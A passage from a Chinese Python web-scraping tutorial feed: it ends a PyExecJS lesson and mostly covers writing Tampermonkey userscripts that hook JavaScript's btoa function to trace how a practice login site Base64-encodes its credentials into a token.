class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">var</span> CryptoJS;</span><br><span class="line">!(<span class="function"><span class="keyword">function</span> (<span class="params">t, e</span>) </span>&#123;</span><br><span class="line">  CryptoJS = e();</span><br><span class="line">  <span class="string">"object"</span> == <span class="keyword">typeof</span> exports</span><br><span class="line">    ? (<span class="built_in">module</span>.exports = exports = e())</span><br><span class="line">    : <span class="string">"function"</span> == <span class="keyword">typeof</span> define &amp;&amp; define.amd</span><br><span class="line">    ? define([], e)</span><br><span class="line">    : (t.CryptoJS = e());</span><br><span class="line">&#125;)(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;);</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们就首先声明了一个 CryptoJS 变量，然后直接给 CryptoJS 变量赋值给 <code>e()</code>，这样就完成了 CryptoJS 的初始化。</p><p>这样我们再重新运行刚才的 Python 脚本，就可以得到执行结果了：</p><figure class="highlight routeros">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">gQSfeqldQIJKAZHH9TzRX/<span class="attribute">exvIwb0j73b2cjXvy6PeZ3rGW6sQsL2w</span>==</span><br></pre>      </td>    </tr>  </table></figure><p>这样我们就成功得到加密字符串了，和示例网站上显示的是一模一样的，这样我们就成功模拟 JavaScript 的调用完成了某个加密算法的运行过程。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>本节介绍了利用 PyExecJS 来模拟执行 JavaScript 的方法，结合一个案例来完成了整个的实现和问题排查的过程。本节内容还是比较重要的，以后我们如果需要模拟执行 JavaScript 就可以派得上用场。</p><p>本节代码；<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvU2NyYXBlU3BhN+OAgg==">https://github.com/Python3WebSpider/ScrapeSpa7。<i class="fa fa-external-link-alt"></i></span></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
  &lt;p&gt;爬虫系列文章总目录：&lt;a href=&quot;https://cuiqingcai.com/17777.html&quot;&gt;【2022 年】Python3 爬虫学习教程&lt;/a&gt;，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2
      
    
    </summary>
    
    
      <category term="Python" scheme="https://cuiqingcai.com/categories/Python/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="网络爬虫" scheme="https://cuiqingcai.com/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    
      <category term="2022" scheme="https://cuiqingcai.com/tags/2022/"/>
    
      <category term="Python 爬虫" scheme="https://cuiqingcai.com/tags/Python-%E7%88%AC%E8%99%AB/"/>
    
      <category term="JavaScript" scheme="https://cuiqingcai.com/tags/JavaScript/"/>
    
      <category term="逆向" scheme="https://cuiqingcai.com/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="模拟执行" scheme="https://cuiqingcai.com/tags/%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>【2022 年】Python3 爬虫教程 - JavaScript Hook 的用法</title>
    <link href="https://cuiqingcai.com/2022113.html"/>
    <id>https://cuiqingcai.com/2022113.html</id>
    <published>2022-03-11T07:33:52.000Z</published>
    <updated>2022-08-01T15:41:25.992Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>一书了，<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">点击了解详情<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><p>在 JavaScript 逆向的时候，我们经常需要追踪某些方法的堆栈调用情况。但在很多情况下，一些 JavaScript 的变量或者方法名经过混淆之后是非常难以捕捉的。上一节我们介绍了一些断点调试、调用栈查看等技巧，但仅仅凭借这些技巧还不足以应对多数 JavaScript 逆向。</p><p>本节我们再来介绍一个比较常用的 JavaScript 逆向技巧 —— Hook 技术。</p><h2 id="1-Hook-技术"><a href="#1-Hook-技术" class="headerlink" title="1. Hook 技术"></a>1. Hook 技术</h2><p>Hook 技术中文又叫作钩子技术，指在程序运行的过程中，对其中的某个方法进行重写，在原先的方法前后加入我们自定义的代码。相当于在系统没有调用该函数之前，钩子程序就先捕获该消息，得到控制权，这时钩子函数既可以加工处理（改变）该函数的执行行为，也可以强制结束消息的传递。</p><p>要对 JavaScript 代码进行 Hook 操作，就需要额外在页面中执行一些自定义的有关 Hook 逻辑的代码。那么问题来了？怎样才能在浏览器中方便地执行我们所期望执行的 JavaScript 代码呢？在这里推荐一个插件，叫作 Tampermonkey。这个插件的功能非常强大，利用它我们几乎可以在网页中执行任何 JavaScript 代码，实现我们想要的功能。</p><p>下面我们就来介绍一下这个插件的使用方法，并结合一个实际案例，介绍一下这个插件在 JavaScript Hook 中的用途。</p><h2 id="2-Tampermonkey"><a href="#2-Tampermonkey" class="headerlink" title="2. Tampermonkey"></a>2. Tampermonkey</h2><p>Tampermonkey，中文也叫作“油猴”，它是一款浏览器插件，支持 Chrome。利用它我们可以在浏览器加载页面时自动执行某些 JavaScript 脚本。由于执行的是 JavaScript，所以我们几乎可以在网页中完成任何我们想实现的效果，如自动爬虫、自动修改页面、自动响应事件等。</p><p>其实，Tampermonkey 的用途远远不止这些，只要我们想要的功能能用 JavaScript 实现，Tampermonkey 就可以帮我们做到。比如我们可以将 Tampermonkey 应用到 JavaScript 逆向分析中，去帮助我们更方便地分析一些 JavaScript 加密和混淆代码。</p><h2 id="3-安装"><a href="#3-安装" class="headerlink" title="3. 安装"></a>3. 安装</h2><p>首先我们需要安装 Tampermonkey，这里我们使用的浏览器是 Chrome。直接在 Chrome 应用商店或者在 Tampermonkey 的官网 <span class="exturl" data-url="aHR0cHM6Ly93d3cudGFtcGVybW9ua2V5Lm5ldC8=">https://www.tampermonkey.net/<i class="fa fa-external-link-alt"></i></span> 下载安装即可。</p><p>安装完成之后，在 Chrome 浏览器的右上角会出现 Tampermonkey 的图标，这就代表安装成功了，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/vyqt9.png" alt=""></p><h2 id="4-获取脚本"><a href="#4-获取脚本" class="headerlink" title="4. 获取脚本"></a>4. 获取脚本</h2><p>Tampermonkey 运行的是 JavaScript 脚本，每个网站都能有对应的脚本运行，不同的脚本能完成不同的功能。这些脚本我们可以自定义，也可以用已经写好的很多脚本，毕竟有些轮子有了，我们就不需要再去造了。</p><p>我们可以在 <span class="exturl" data-url="aHR0cHM6Ly9ncmVhc3lmb3JrLm9yZy96aC1DTi9zY3JpcHRz">https://greasyfork.org/zh-CN/scripts<i class="fa fa-external-link-alt"></i></span> 找到一些非常实用的脚本，如全网视频去广告、百度云全网搜索等，大家可以体验一下。</p><h2 id="5-脚本编写"><a href="#5-脚本编写" class="headerlink" title="5. 脚本编写"></a>5. 脚本编写</h2><p>除了使用别人已经写好的脚本，我们也可以自己编写脚本来实现想要的功能。编写脚本难不难呢？其实就是写 JavaScript 代码，只要懂一些 JavaScript 的语法就好了。另外我们需要遵循脚本的一些写作规范，其中就包括一些参数的设置。</p><p>下面我们就简单实现一个小的脚本。首先我们可以点击 Tampermonkey 插件图标，再点击“管理面板”按钮，打开脚本管理页面，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/4u47o.png" alt=""></p><p>脚本管理页面如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/w2zuf.png" alt=""></p><p>在这里显示了我们已经有的一些 Tampermonkey 脚本，包括我们自行创建的，也包括从第三方网站下载安装的。另外这里提供了编辑、调试、删除等管理功能，在这里可以方便地对脚本进行管理。</p><p>接下来我们来创建一个新的脚本，点击左侧的“+”号，会显示如图所示的页面。</p><p><img src="https://qiniu.cuiqingcai.com/pqq74.png" alt=""></p><p>初始化的代码如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         New Userscript</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  try to take over the world!</span></span><br><span class="line"><span class="comment">// @author       You</span></span><br><span class="line"><span class="comment">// @match        https://www.tampermonkey.net/documentation.php?ext=dhdg</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  "use strict"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Your code here...</span></span><br><span class="line">&#125;)();</span><br></pre>      </td>    </tr>  </table></figure><p>在上面这段代码里，最前面是一些注释，它们非常有用，这部分内容叫作 <code>UserScript Header</code> ，我们可以在里面配置一些脚本的信息，如名称、版本、描述、生效站点等等。</p><p>下面简单介绍一下 <code>UserScript Header</code> 的一些参数定义。</p><ul>  <li>    <p><code>@name</code>：脚本的名称，就是在控制面板显示的脚本名称。</p>  </li>  <li>    <p><code>@namespace</code>：脚本的命名空间。</p>  </li>  <li>    <p><code>@version</code>：脚本的版本，主要是做版本更新时用。</p>  </li>  <li>    <p><code>@author</code>：作者。</p>  </li>  <li>    <p><code>@description</code>：脚本描述。</p>  </li>  <li>    <p><code>@homepage</code>、 <code>@homepageURL</code>、 <code>@website</code>、<code>@source</code>：作者主页，用于在 Tampermonkey 选项页面上从脚本名称点击跳转。请注意，如果 <code>@namespace</code> 标记以 <code>http://</code>开头，此处也要一样。</p>  </li>  <li>    <p><code>@icon</code>、 <code>@iconURL</code> 、<code>@defaulticon</code>：低分辨率图标。</p>  </li>  <li>    <p><code>@icon64</code> 、 <code>@icon64URL</code>：64 × 64 高分辨率图标。</p>  </li>  <li>    <p><code>@updateURL</code>：检查更新的网址，需要定义 <code>@version</code>。</p>  </li>  <li>    <p><code>@downloadURL</code>：更新下载脚本的网址，如果定义成 <code>none</code> 就不会检查更新。</p>  </li>  <li>    <p><code>@supportURL</code>：报告问题的网址。</p>  </li>  <li>    <p><code>@include</code>：生效页面，可以配置多个，但注意这里并不支持 URL Hash。</p>    <p>例如：</p>    <figure class="highlight jboss-cli">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>          </td>          <td class="code">            <pre><span class="line"><span class="string">//</span> @include http:<span class="string">//www.tampermonkey.net/</span>*</span><br><span class="line"><span class="string">//</span> @include http:<span class="string">//</span>*</span><br><span class="line"><span class="string">//</span> @include https:<span class="string">//</span>*</span><br><span class="line"><span class="string">//</span> @include *</span><br></pre>          </td>        </tr>      </table>    </figure>  </li>  <li>    <p><code>@match</code>：约等于 <code>@include</code> 标签，可以配置多个。</p>  </li>  <li>    <p><code>@exclude</code>：不生效页面，可配置多个，优先级高于 <code>@include</code> 和 <code>@match</code>。</p>  </li>  <li>    <p><code>@require</code>：附加脚本网址，相当于引入外部的脚本，这些脚本会在自定义脚本执行之前执行，比如引入一些必须的库，如 jQuery 等，这里可以支持配置多个 <code>@require</code> 参数。</p>    <p>例如：</p>    <figure class="highlight vim">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>          </td>          <td class="code">            <pre><span class="line">// @require http<span class="variable">s:</span>//code.jquery.<span class="keyword">com</span>/jquery-<span class="number">2.1</span>.<span class="number">4</span>.<span class="built_in">min</span>.js</span><br><span class="line">// @require http<span class="variable">s:</span>//code.jquery.<span class="keyword">com</span>/jquery-<span class="number">2.1</span>.<span class="number">3</span>.<span class="built_in">min</span>.js#sha256=<span class="number">23456</span>...</span><br><span class="line">// @require http<span class="variable">s:</span>//code.jquery.<span class="keyword">com</span>/jquery-<span class="number">2.1</span>.<span class="number">2</span>.<span class="built_in">min</span>.js#md5=<span class="number">34567</span>...,<span class="built_in">sha256</span>=<span class="number">6789</span>...</span><br></pre>          </td>        </tr>      </table>    </figure>  </li>  <li>    <p><code>@resource</code>：预加载资源，可通过 <code>GM_getResourceURL</code> 和 <code>GM_getResourceText</code> 读取。</p>  </li>  <li>    <p><code>@connect</code>：允许被 <code>GM_xmlhttpRequest</code> 访问的域名，每行 1 个。</p>  </li>  <li>    <p><code>@run-at</code>：脚本注入的时刻，如页面刚加载时，某个事件发生后等。</p>    <ul>      <li><code>document-start</code>：尽可能地早执行此脚本。</li>      <li><code>document-body</code>：DOM 的 body 出现时执行。</li>      <li><code>document-end</code>：<code>DOMContentLoaded</code> 事件发生时或发生后执行。</li>      <li><code>document-idle</code>：<code>DOMContentLoaded</code> 事件发生后执行，即 DOM 加载完成之后执行，这是默认的选项。</li>      <li><code>context-menu</code>：如果在浏览器上下文菜单（仅限桌面 Chrome 浏览器）中点击该脚本，则会注入该脚本。注意：如果使用此值，则将忽略所有 <code>@include</code> 和 <code>@exclude</code> 语句。</li>    </ul>  </li>  <li>    <p><code>@grant</code>：用于添加 GM 函数到白名单，相当于授权某些 GM 函数的使用权限。</p>    <p>例如：</p>    <figure class="highlight pgsql">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>          </td>          <td class="code">            <pre><span class="line">// @<span class="keyword">grant</span> GM_setValue</span><br><span class="line">// @<span class="keyword">grant</span> GM_getValue</span><br><span class="line">// @<span class="keyword">grant</span> GM_setClipboard</span><br><span class="line">// @<span class="keyword">grant</span> unsafeWindow</span><br><span class="line">// @<span class="keyword">grant</span> <span class="keyword">window</span>.<span class="keyword">close</span></span><br><span class="line">// @<span class="keyword">grant</span> <span class="keyword">window</span>.focus</span><br></pre>          </td>        </tr>      </table>    </figure>    <p>如果没有定义过 <code>@grant</code> 选项，Tampermonkey 会猜测所需要的函数使用情况。</p>  </li>  <li>    <p><code>@noframes</code>：此标记使脚本在主页面上运行，但不会在 iframe 上运行。</p>  </li>  <li>    <p><code>@nocompat</code>：由于部分代码可能是为专门的浏览器所写，通过此标记，Tampermonkey 会知道脚本可以运行的浏览器。</p>    <p>例如：</p>    <figure class="highlight 1c">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br></pre>          </td>          <td class="code">            <pre><span class="line"><span class="comment">// @nocompat Chrome</span></span><br></pre>          </td>        </tr>      </table>    </figure>    <p>这样就指定了脚本只在 Chrome 浏览器中运行。</p>  </li></ul><p>除此之外，Tampermonkey 还定义了一些 API，使得我们可以方便地完成某个操作。</p><ul>  <li><code>GM_log</code>：将日志输出到控制台。</li>  <li><code>GM_setValue</code>：将参数内容保存到 Storage 中。</li>  <li><code>GM_addValueChangeListener</code>：为某个变量添加监听，当这个变量的值改变时，就会触发回调。</li>  <li><code>GM_xmlhttpRequest</code>：发起 Ajax 请求。</li>  <li><code>GM_download</code>：下载某个文件到磁盘。</li>  <li><code>GM_setClipboard</code>：将某个内容保存到粘贴板。</li></ul><p>还有很多其他的 API，大家可以到 <span class="exturl" data-url="aHR0cHM6Ly93d3cudGFtcGVybW9ua2V5Lm5ldC9kb2N1bWVudGF0aW9uLnBocA==">https://www.tampermonkey.net/documentation.php<i class="fa fa-external-link-alt"></i></span> 查看更多的内容。</p><p>在 <code>UserScript Header</code> 下方是 JavaScript 函数和调用的代码，其中 <code>&#39;use strict&#39;</code> 标明代码使用 JavaScript 的严格模式。在严格模式下，可以消除 Javascript 语法的一些不合理、不严谨之处，减少一些怪异行为，如不能直接使用未声明的变量，这样可以保证代码的运行安全，同时提高编译器的效率，提高运行速度。在下方 <code>// Your code here...</code> 处就可以编写自己的代码了。</p><h2 id="6-实战分析"><a href="#6-实战分析" class="headerlink" title="6. 实战分析"></a>6. 实战分析</h2><p>下面我们通过一个简单的 JavaScript 逆向案例来演示一下如何实现 JavaScript 的 Hook 操作，轻松找到某个方法执行的位置，从而快速定位逆向入口。</p><p>接下来我们来看一个简单的网站：<span class="exturl" data-url="aHR0cHM6Ly9sb2dpbjEuc2NyYXBlLmNlbnRlci/vvIzov5nkuKrnvZHnq5nnmoTnu5PmnoTpnZ7luLjnroDljZXvvIzlsLHmmK/kuIDkuKrnlKjmiLflkI3lr4bnoIHnmbvlvZXjgILkvYbmmK/kuI3lkIznmoTmmK/vvIzngrnlh7vnmbvlvZXnmoTml7blgJnvvIzooajljZXmj5DkuqQ=">https://login1.scrape.center/，这个网站的结构非常简单，就是一个用户名密码登录。但是不同的是，点击登录的时候，表单提交<i class="fa fa-external-link-alt"></i></span> POST 的内容并不是单纯的用户名和密码，而是一个加密后的 token。</p><p>页面如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/h09sh.png" alt="image-20210509215948819"></p><p>我们输入用户名密码，都为 admin，点击登录按钮，观察一下网络请求的变化。</p><p>可以看到如下结果如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/neccv.png" alt="image-20210509220046359"></p><p>我们不需要关心 Response 的结果和状态，主要看 Request 的内容就好了。</p><p>可以看到，点击登录按钮时，发起了了一个 POST 请求，内容为：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&#123;<span class="string">"token"</span>:<span class="string">"eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9"</span>&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>嗯，确实，没有诸如 <code>username</code> 和 <code>password</code> 的内容了，那怎么模拟登录呢？</p><p>模拟登录的前提当然就是找到当前 token 生成的逻辑了，那么问题来了，到底这个 token 和用户名、密码是什么关系呢？我们怎么来找寻其中的蛛丝马迹呢？</p><p>这里我们就可能思考了，本身输入的是用户名和密码，但提交的时候却变成了一个 token，经过观察并结合一些经验可以看出，token 的内容非常像 Base64 编码。这就代表，网站可能首先将用户名密码混为了一个新的字符串，然后经过了一次 Base64 编码，最后将其赋值为 token 来提交了。所以，初步观察我们可以得出这么多信息。</p><p>好，那就来验证一下吧！探究网站 JavaScript 代码里面是如何实现的。</p><p>首先我们看一下网站的源码，打开 Sources 面板，看起来都是 Webpack 打包之后的内容，经过了一些混淆，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/ztakd.png" alt="image-20210509222556397"></p><p>这么多混淆代码，总不能一点点扒着看吧？那么遇到这种情形，这怎么去找 token 的生成位置呢？</p><p>解决方法其实有两种，一种就是前文所讲的 Ajax 断点，另一种就是 Hook。</p><h3 id="Ajax-断点"><a href="#Ajax-断点" class="headerlink" title="Ajax 断点"></a>Ajax 断点</h3><p>由于这个请求正好是一个 Ajax 请求，所以我们可以添加一个 XHR 断点监听，把 POST 的网址加到断点监听上面。在 Sources 面板右侧添加一个 XHR 断点，匹配内容就填当前域名就好了，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/icog3.png" alt="image-20210509223127936"></p><p>这时候如果我们再次点击登录按钮，发起一次 Ajax 请求，就可以进入断点了，然后再看堆栈信息，就可以一步步找到编码的入口了。</p><p>再次点击登录按钮，页面就进入断点状态停下来了，结果如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/dz078.png" alt="image-20210509223337762"></p><p>一步步找，最后可以找到入口其实是在 <code>onSubmit</code> 方法那里。但实际上我们观察到，这里的断点的栈顶还包括了一些类似 async Promise 等无关的内容，而我们真正想找的是用户名和密码经过处理，再进行 Base64 编码的地方，这些请求的调用实际上和我们找寻的入口没有很大的关系。</p><p>另外，如果我们想找的入口位置并不伴随这一次 Ajax 请求，这个方法就没法用了。</p><p>所以下面我们再来看另一个方法 —— Hook。</p><h3 id="Hook-Function"><a href="#Hook-Function" class="headerlink" title="Hook Function"></a>Hook Function</h3><p>所以这里介绍第二种可以快速定位入口的方法，那就是使用 Tampermonkey 自定义 JavaScript，实现某个 JavaScript 方法的 Hook。Hook 哪里呢？很明显，Hook Base64 编码的位置就好了。</p><p>那么这里就涉及一个小知识点：JavaScript 里面的 Base64 编码是怎么实现的？</p><p>没错，就是 <code>btoa</code> 方法，在 JavaScript 中该方法用于将字符串编码成 Base64 字符串，因此我们来 Hook <code>btoa</code> 方法就好了。</p><p>好，这里我们新建一个 Tampermonkey 脚本，内容如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         HookBase64</span></span><br><span class="line"><span class="comment">// @namespace    https://login1.scrape.center/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  Hook Base64 encode function</span></span><br><span class="line"><span class="comment">// @author       Germey</span></span><br><span class="line"><span class="comment">// @match        https://login1.scrape.center/</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  "use strict"</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">hook</span>(<span class="params">object, attr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> func = object[attr];</span><br><span class="line">    object[attr] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"hooked"</span>, object, attr);</span><br><span class="line">      <span class="keyword">var</span> ret = func.apply(object, <span class="built_in">arguments</span>);</span><br><span class="line">      <span class="keyword">debugger</span>;</span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  hook(<span class="built_in">window</span>, <span class="string">"btoa"</span>);</span><br><span class="line">&#125;)();</span><br></pre>      </td>    </tr>  </table></figure><p>首先我们定义了一些 <code>UserScript Header</code>，包括 <code>@name</code>和<code>@match</code>等，这里比较重要的就是<code>@name</code>，表示脚本名称；另外一个就是 <code>@match</code>，它代表脚本生效的网址。</p><p>脚本的内容如上面代码所示。我们定义了一个 <code>hook</code>方法，传入 <code>object</code> 和 <code>attr</code> 参数，意思就是 Hook <code>object</code> 对象的 <code>attr</code>参数。例如我们如果想 Hook <code>alert</code> 方法，那就把 <code>object</code> 设置为 <code>window</code>，把 <code>attr</code> 设置为字符串 <code>alert</code> 。这里我们想要 Hook Base64 的编码方法，而在 JavaScript 中，Based64 编码是用 <code>btoa</code> 方法实现的，所以这里我们就只需要 Hook <code>window</code> 对象的 <code>btoa</code> 方法就好了。</p><p>那么 Hook 是怎么实现的呢？我们来看已下，首先一句 <code>var func = object[attr]</code>，相当于我们先把它赋值为一个变量，我们调用 <code>func</code> 方法就可以实现和原来相同的功能。接着，我们直接改写这个方法的定义，将 <code>object[attr]</code> 改写成一个新的方法，在新的方法中，通过 <code>func.apply</code> 方法又重新调用了原来的方法。这样我们就可以保证前后方法的执行效果是不受什么影响的，之前这个方法该干啥就还是干啥。</p><p>但是和之前不同的是，我们自定义方法之后，现在可以在 <code>func</code> 方法执行的前后，再加入自己的代码，如 <code>console.log</code> 将信息输出到控制台，<code>debugger</code> 进入断点等。在这个过程中，我们先临时保存下来了 <code>func</code> 方法，然后定义一个新的方法，接管程序控制权，在其中自定义我们想要的实现，同时在新的方法里面重新调回 <code>func</code> 方法，保证前后结果是不受影响的。所以，我们达到了在不影响原有方法效果的前提下，实现在方法前后自定义的功能，这就是 Hook 的过程。</p><p>最后，我们调用 <code>hook</code> 方法，传入 <code>window</code> 对象和 <code>btoa</code> 字符串，保存。</p><p>接下来刷新下页面，这时候我们就可以看到这个脚本在当前页面生效了，可以发现 Tempermonkey 插件面板提示了已经启用，同时在 Sources 面板下的 Page 选项卡可以观察到我们定义的 JavaScript 脚本被执行了，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/acsk0.png" alt="image-20210509223942108"></p><p>然后输入用户名、密码，点击提交，成功进入了断点模式停下来了，代码就卡在了我们自定义的 <code>debugger</code> 这一行代码的位置，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/n0or9.png" alt="image-20210509224216857"></p><p>成功 Hook 住了，这说明 JavaScript 代码在执行过程中调用到了 <code>btoa</code> 方法。</p><p>这时看一下控制台，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/ev1me.png" alt="image-20210509224328452"></p><p>这里也输出了 <code>window</code> 对象和 <code>btoa</code> 方法，验证正确。</p><p>这样，我们就顺利找到了 Base64 编码操作这个路口，然后看一下堆栈信息，也已经不会出现 async、Promise 这样的调用了，很清晰地呈现了 <code>btoa</code> 方法逐层调用的过程，非常清晰明了，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/17rng.png" alt="image-20210509224356222"></p><p>另外再观察下 Local 面板，看看 <code>arguments</code> 变量是怎样的，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/0wuj4.png" alt="image-20210509224448758"></p><p>可以说一目了然了，<code>arguments</code> 就是指传给 <code>btoa</code> 方法的参数，<code>ret</code> 就是 <code>btoa</code> 方法返回的结果，可以看到 <code>arguments</code> 就是 <code>username</code> 和 <code>password</code> 通过 JSON 序列化之后的字符串，经过 Base64 编码之后得到的值恰好就是 Ajax 请求参数 <code>token</code> 的值。</p><p>结果几乎也明了了，我们还可以通过调用栈找到 <code>onSubmit</code> 方法的处理源码：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line">onSubmit: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> e = c.encode(<span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.form));</span><br><span class="line">  <span class="keyword">this</span>.$http.post(a[<span class="string">"a"</span>].state.url.root, &#123;</span><br><span class="line">    token: e</span><br><span class="line">  &#125;).then((<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"data"</span>, e)</span><br><span class="line">  &#125;))</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>仔细看看，<code>encode</code> 方法其实就是调用了一下 <code>btoa</code>方法，就是一个 Base64 编码的过程，答案其实已经很明了了。</p><p>当然我们还可以进一步打断点验证一下流程，比如在调用 <code>encode</code> 方法的一行打断点，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/94afz.png" alt="image-20210509224938312"></p><p>打完断点之后，可以点击 Resume 按钮恢复 JavaScript 的执行，跳过当前 Tempermonkey 定义的断点位置，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/wif60.png" alt="image-20210509225049534"></p><p>然后重新再点击登录按钮，可以看到这时候就停在了当前打断点的位置了，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/db9n7.png" alt="image-20210509225531743"></p><p>这时候可以在 Watch 面板下输入 <code>this.form</code>，验证此处是否为在表单中输入的用户名密码，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/vn5bl.png" alt="image-20210509225732574"></p><p>没问题，然后逐步调试。我们还可以可以观察到，下一步就跳到了我们 Hook 的位置，这说明调用了 <code>btoa</code> 方法，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/jvx5f.png" alt="image-20210509225907721"></p><p>返回的结果正好就是 token 的值。</p><p>所以，验证到这里，已经非常清晰了，整体逻辑就是对登录表单的用户名和密码进行了 JSON 序列化，然后调用了 <code>encode</code> 也就是 <code>btoa</code> 方法，并赋值为了 <code>token</code> 发起登录的 Ajax 请求，逆向完成。</p><p>我们通过 Tampermonkey 自定义 JavaScript 脚本的方式，实现了某个方法调用的 Hook，使得我们能快速定位到加密入口的位置，非常方便。</p><p>以后如果观察出一些门道，可以多使用这种方法来尝试，如 Hook <code>encode</code> 